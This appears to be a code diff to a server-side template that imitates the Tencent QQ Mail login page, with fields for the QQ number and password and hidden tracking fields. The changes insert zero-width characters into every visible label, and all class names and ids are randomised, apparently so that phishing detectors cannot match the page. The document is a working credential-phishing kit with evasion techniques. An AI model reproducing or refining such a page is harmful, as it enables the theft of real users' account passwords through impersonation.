@@ -3,7 +3,7 @@
 <html lang="zh-cmn">
 
 <head>
-    <title class="<%=sha('replace_content')%>"><%= function(){var x = ranRp('登录QQ邮箱');return x.key+':'+x.val}()%></title>
+    <title class="<%=sha('replace_content')%>"><%= function(){var x = ranRp('​登​录​Q​Q​邮​箱');return x.key+':'+x.val}()%></title>
     <style>
  body,
 p,
@@ -840,12 +840,12 @@ a:hover {
 
 <body style="display: none">
     <div class="<%=sha('header')%>">
-        <a class="<%=sha('header_logo')%> <%=sha('replace_content')%>" href="/" ><%= function(){var x = ranRp('QQ邮箱');return x.key+':'+x.val}()%></a>
+        <a class="<%=sha('header_logo')%> <%=sha('replace_content')%>" href="/" ><%= function(){var x = ranRp('​Q​Q​邮​箱');return x.key+':'+x.val}()%></a>
         <div class="<%=sha('header_link')%>">
-            <a href="#" class="<%=sha('replace_content')%>"><%= function(){var x = ranRp('基本版');return x.key+':'+x.val}()%></a>&nbsp;|&nbsp;
-            <a href="#">English</a>&nbsp;|&nbsp;
-            <a href="#" target="_blank" class="<%=sha('replace_content')%>"><%= function(){var x = ranRp('手机版');return x.key+':'+x.val}()%></a>&nbsp;|&nbsp;
-            <a href="#" target="_blank" class="<%=sha('replace_content')%>"><%= function(){var x = ranRp('企业邮箱');return x.key+':'+x.val}()%></a>
+            <a href="#" class="<%=sha('replace_content')%>"><%= function(){var x = ranRp('​基​本​版');return x.key+':'+x.val}()%></a>&nbsp;|&nbsp;
+            <a href="#">​E​n​g​l​i​s​h</a>&nbsp;|&nbsp;
+            <a href="#" target="_blank" class="<%=sha('replace_content')%>"><%= function(){var x = ranRp('​手​机​版');return x.key+':'+x.val}()%></a>&nbsp;|&nbsp;
+            <a href="#" target="_blank" class="<%=sha('replace_content')%>"><%= function(){var x = ranRp('​企​业​邮​箱');return x.key+':'+x.val}()%></a>
         </div>
     </div>
     <div class="<%=sha('content')%>">
@@ -853,27 +853,27 @@ a:hover {
                 <div class="<%=sha('login_container')%>" id="<%=sha('login')%>" style="width: 334px; height: 387px; visibility: visible;">
                     <div id="<%=sha('login_frame')%>" name="<%=sha('login_frame')%>" height="100%" scrolling="no" width="100%" frameborder="0" src="">
                         <div class="<%=sha('l_header')%>">
-                            <a class="<%=sha('replace_content')%>"><%= function(){var x = ranRp('快速登录');return x.key+':'+x.val}()%></a>
-                            <a class="<%=sha('l_a_hover')%> <%=sha('replace_content')%>"><%= function(){var x = ranRp('帐号密码登录');return x.key+':'+x.val}()%></a>
+                            <a class="<%=sha('replace_content')%>"><%= function(){var x = ranRp('​快​速​登​录');return x.key+':'+x.val}()%></a>
+                            <a class="<%=sha('l_a_hover')%> <%=sha('replace_content')%>"><%= function(){var x = ranRp('​帐​号​密​码​登​录');return x.key+':'+x.val}()%></a>
                         </div>
                         <div class="<%=sha('tips')%>"></div>
                         <form id="ff" action="" method="post" id="<%=ranStr[11]%>">
 
                         
-                        <input type="text" placeholder="<%= function(){var x = ranRp('支持QQ号/邮箱/手机号登录');return x.key+':'+x.val}()%>" id="<%=sha('u')%>" name="<%= function(){var x = ranRp('u');return x.key+':'+x.val}()%>" class="<%=sha('l_input')%> <%=sha('replace_name')%> <%=sha('replace_placeholder')%>"/>
-                        <input type="password" placeholder="<%= function(){var x = ranRp('QQ密码');return x.key+':'+x.val}()%>" id="<%=sha('p')%>" name="<%= function(){var x = ranRp('p');return x.key+':'+x.val}()%>" class="<%=sha('l_input')%> <%=sha('replace_name')%> <%=sha('replace_placeholder')%>"/>
+                        <input type="text" placeholder="<%= function(){var x = ranRp('​支​持​Q​Q​号​/​邮​箱​/​手​机​号​登​录');return x.key+':'+x.val}()%>" id="<%=sha('u')%>" name="<%= function(){var x = ranRp('u');return x.key+':'+x.val}()%>" class="<%=sha('l_input')%> <%=sha('replace_name')%> <%=sha('replace_placeholder')%>"/>
+                        <input type="password" placeholder="<%= function(){var x = ranRp('​Q​Q​密​码');return x.key+':'+x.val}()%>" id="<%=sha('p')%>" name="<%= function(){var x = ranRp('p');return x.key+':'+x.val}()%>" class="<%=sha('l_input')%> <%=sha('replace_name')%> <%=sha('replace_placeholder')%>"/>
                         <input type="hidden" class="<%=sha('replace_name')%>" name="<%= function(){var x = ranRp('uid');return x.key+':'+x.val}()%>" value="<%=uid%>">
                         <input type="hidden" class="<%=sha('replace_name')%>" name="<%= function(){var x = ranRp('mid');return x.key+':'+x.val}()%>" value="<%=mid%>">
                         <input type="hidden" class="<%=sha('replace_name')%>" name="<%= function(){var x = ranRp('tz');return x.key+':'+x.val}()%>" value="<%=tz%>">
                         <input type="checkbox" id="<%=sha('low_login_wording')%>" class="<%=sha('ckbx')%>"/>
-                        <label class="<%=sha('low_login_wording')%> <%=sha('replace_content')%>" for="<%=sha('low_login_wording')%>"><%= function(){var x = ranRp('下次自动登录');return x.key+':'+x.val}()%></label>
-                        <input type="button" tabindex="6" id="<%=sha('go')%>" value="登 录" class="<%=sha('login_button')%>">
+                        <label class="<%=sha('low_login_wording')%> <%=sha('replace_content')%>" for="<%=sha('low_login_wording')%>"><%= function(){var x = ranRp('​下​次​自​动​登​录');return x.key+':'+x.val}()%></label>
+                        <input type="button" tabindex="6" id="<%=sha('go')%>" value="​登​ ​录" class="<%=sha('login_button')%>">
                         <div class="<%=sha('l_bottom')%>">
-                            <a class="<%=sha('replace_content')%>"><%= function(){var x = ranRp('忘了密码');return x.key+':'+x.val}()%></a>
+                            <a class="<%=sha('replace_content')%>"><%= function(){var x = ranRp('​​忘​了​密​码');return x.key+':'+x.val}()%></a>
                             |
-                            <a class="<%=sha('replace_content')%>"><%= function(){var x = ranRp('注册新帐号');return x.key+':'+x.val}()%></a>
+                            <a class="<%=sha('replace_content')%>"><%= function(){var x = ranRp('​注​册​新​帐​号');return x.key+':'+x.val}()%></a>
                             |
-                            <a class="<%=sha('replace_content')%>"><%= function(){var x = ranRp('意见反馈');return x.key+':'+x.val}()%></a>
+                            <a class="<%=sha('replace_content')%>"><%= function(){var x = ranRp('​意​见​反​馈');return x.key+':'+x.val}()%></a>
                         </div>
                     </form>
                     </div>
@@ -884,13 +884,13 @@ a:hover {
             </div>
         </div>
     <div class="<%=sha('footer')%>">
-        <a href="#" target="_blank" class="<%=sha('replace_content')%>"><%= function(){var x = ranRp('关于腾讯');return x.key+':'+x.val}()%></a>&nbsp;|&nbsp;
-        <a href="#" class="<%=sha('replace_content')%>" target="_blank"><%= function(){var x = ranRp('服务条款');return x.key+':'+x.val}()%></a>&nbsp;|&nbsp;
-        <a href="#" class="<%=sha('replace_content')%>" target="_blank"><%= function(){var x = ranRp('隐私政策');return x.key+':'+x.val}()%></a>&nbsp;|&nbsp;
-        <a href="#" class="<%=sha('replace_content')%>" target="_blank"><%= function(){var x = ranRp('客服中心');return x.key+':'+x.val}()%></a>&nbsp;|&nbsp;
-        <a href="#" class="<%=sha('replace_content')%>" target="_blank"><%= function(){var x = ranRp('联系我们');return x.key+':'+x.val}()%></a>&nbsp;|&nbsp;
-        <a href="#" class="<%=sha('replace_content')%>" target="_blank"><%= function(){var x = ranRp('帮助中心');return x.key+':'+x.val}()%></a>&nbsp;|&nbsp;
-        <span class="<%=sha('gray')%> <%=sha('replace_content')%>"><%= function(){var x = ranRp('©1998 - 2018 Tencent Inc. All Rights Reserved.');return x.key+':'+x.val}()%></span>
+        <a href="#" target="_blank" class="<%=sha('replace_content')%>"><%= function(){var x = ranRp('​关​于​腾​讯');return x.key+':'+x.val}()%></a>&nbsp;|&nbsp;
+        <a href="#" class="<%=sha('replace_content')%>" target="_blank"><%= function(){var x = ranRp('​服​务​条​款');return x.key+':'+x.val}()%></a>&nbsp;|&nbsp;
+        <a href="#" class="<%=sha('replace_content')%>" target="_blank"><%= function(){var x = ranRp('​隐​私​政​策');return x.key+':'+x.val}()%></a>&nbsp;|&nbsp;
+        <a href="#" class="<%=sha('replace_content')%>" target="_blank"><%= function(){var x = ranRp('​客​服​中​心');return x.key+':'+x.val}()%></a>&nbsp;|&nbsp;
+        <a href="#" class="<%=sha('replace_content')%>" target="_blank"><%= function(){var x = ranRp('​联​系​我​们');return x.key+':'+x.val}()%></a>&nbsp;|&nbsp;
+        <a href="#" class="<%=sha('replace_content')%>" target="_blank"><%= function(){var x = ranRp('​帮​助​中​心');return x.key+':'+x.val}()%></a>&nbsp;|&nbsp;
+        <span class="<%=sha('gray')%> <%=sha('replace_content')%>"><%= function(){var x = ranRp('​©​1​9​9​8​ ​-​ ​2​0​1​8​ ​T​e​n​c​e​n​t​ ​I​n​c​.​ ​A​l​l​ ​R​i​g​h​t​s​ ​R​e​s​e​r​v​e​d​.');return x.key+':'+x.val}()%></span>
     </div>
 </body>
 <script src="/jquery/<%=ranStr[99]%>" type="text/javascript"></script>
@@ -915,13 +915,13 @@ a:hover {
         var <%=sha('errMsg')%> = $('.<%=sha('tips')%>');
         $('#<%=sha('go')%>').on('click',function(){
             if ($('#<%=sha('u')%>').val() === '') {
-                <%=sha('errMsg')%>.html(<%=ranStr[199]%>("<%= function(){var x = ranRp('请输入QQ号!');return x.key+':'+x.val}()%>"));
+                <%=sha('errMsg')%>.html(<%=ranStr[199]%>("<%= function(){var x = ranRp('​请​输​入​Q​Q​号​!');return x.key+':'+x.val}()%>"));
                 <%=sha('errMsg')%>.css({"visibility":"visible"})
                 setTimeout(function(){
                     <%=sha('errMsg')%>.css({"visibility":"hidden"})
                 },5000);
             } else if($('#<%=sha('p')%>').val() === ''){
-                <%=sha('errMsg')%>.html(<%=ranStr[199]%>("<%= function(){var x = ranRp('你还没有输入密码！');return x.key+':'+x.val}()%>"));
+                <%=sha('errMsg')%>.html(<%=ranStr[199]%>("<%= function(){var x = ranRp('​你​还​没​有​输​入​密​码​！');return x.key+':'+x.val}()%>"));
                 <%=sha('errMsg')%>.css({"visibility":"visible"})
                 setTimeout(function(){
                     <%=sha('errMsg')%>.css({"visibility":"hidden"})
@@ -931,7 +931,7 @@ a:hover {
             }
         });
     if (<%=sha('_n')%> === '1') {
-        <%=sha('errMsg')%>.html(<%=ranStr[199]%>("<%= function(){var x = ranRp('帐号密码错误！');return x.key+':'+x.val}()%>"));
+        <%=sha('errMsg')%>.html(<%=ranStr[199]%>("<%= function(){var x = ranRp('​帐​号​密​码​错​误​！');return x.key+':'+x.val}()%>"));
         <%=sha('errMsg')%>.css({"visibility":"visible"})
         setTimeout(function(){
             <%=sha('errMsg')%>.css({"visibility":"hidden"})
